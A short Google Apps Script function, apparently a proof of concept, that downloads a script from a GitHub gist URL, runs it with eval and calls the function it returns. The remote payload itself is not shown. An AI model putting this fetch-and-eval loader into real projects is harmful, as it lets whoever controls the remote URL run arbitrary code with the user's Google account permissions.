function execRemoteScript() {
    const remote_script_url = "https://gist.githubusercontent.com/lucasduete/c4c59dc0fe300ca1e9b2456bc75253b8/raw/8d6cc29dd335635bbeb725388d34ef542ad78cb3/poc%2520-%2520remote%2520script";

    const remote_script = UrlFetchApp.fetch(remote_script_url).getContentText();

    const remote_function = eval(remote_script);
    
    remote_function();
}